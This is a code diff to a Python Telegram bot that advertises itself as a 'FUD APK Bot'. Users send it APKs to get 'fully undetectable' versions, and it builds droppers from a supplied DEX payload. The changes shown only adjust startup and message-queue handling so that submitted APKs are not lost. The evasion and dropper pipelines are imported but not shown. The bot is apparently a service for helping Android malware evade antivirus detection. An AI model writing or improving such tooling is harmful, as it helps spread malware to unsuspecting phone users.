@@ -15,6 +15,7 @@ from telegram.error import Conflict
 
 from config import BOT_TOKEN, WORK_DIR
 from pipeline import full_fud_pipeline, full_fud_pipeline_dropper, ensure_tools
+from setup import _setup_done, _setup_error
 
 
 flask_app = Flask(__name__)
@@ -30,7 +31,6 @@ def run_flask():
     flask_app.run(host="0.0.0.0", port=port, use_reloader=False, debug=False)
 
 
-# ============ helpers ============
 async def _heartbeat(status, stop_event, prefix):
     start = time.time()
     while not stop_event.is_set():
@@ -46,12 +46,11 @@ async def _heartbeat(status, stop_event, prefix):
             pass
 
 
-# ============ handlers ============
 async def handle_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🤖 *FUD APK Bot*\n\n"
         "• APK bhejo → FUD APK milega\n"
-        "• /dropper + DEX bhejo → phir APK → dropper\n\n"
+        "• /dropper + DEX → phir APK → dropper\n\n"
         "First run pe tools auto-download (2-5 min).",
         parse_mode="Markdown",
     )
@@ -189,9 +188,16 @@ async def handle_dropper_apk(update: Update, context: ContextTypes.DEFAULT_TYPE)
         shutil.rmtree(session_dir, ignore_errors=True)
 
 
-# ============ bot bootstrap ============
 async def run_bot():
-    await asyncio.sleep(8)
+    # Tools complete hone tak wait karo. Telegram messages queue me rahenge.
+    print("[*] waiting for tools before polling...", flush=True)
+    while not _setup_done.is_set():
+        await asyncio.sleep(2)
+    if _setup_error["exc"]:
+        print(f"[!] setup failed, bot still starting: {_setup_error['exc']}", flush=True)
+    print("[✓] tools ready, starting polling...", flush=True)
+
+    await asyncio.sleep(3)
 
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", handle_start))
@@ -206,7 +212,8 @@ async def run_bot():
     ))
 
     try:
-        await app.bot.delete_webhook(drop_pending_updates=True)
+        # pending updates DROP MAT karo — user ke bheje APK queue me hai
+        await app.bot.delete_webhook(drop_pending_updates=False)
     except Exception as e:
         print(f"[!] delete_webhook: {e}", flush=True)
 
@@ -217,7 +224,7 @@ async def run_bot():
         try:
             await app.updater.start_polling(
                 allowed_updates=Update.ALL_TYPES,
-                drop_pending_updates=True,
+                drop_pending_updates=False,   # <- yahi fix hai
             )
             print("🤖 Bot polling active.", flush=True)
             break
@@ -231,7 +238,6 @@ async def run_bot():
     await asyncio.Event().wait()
 
 
-# ============ entry ============
 def main():
     os.makedirs(WORK_DIR, exist_ok=True)
 
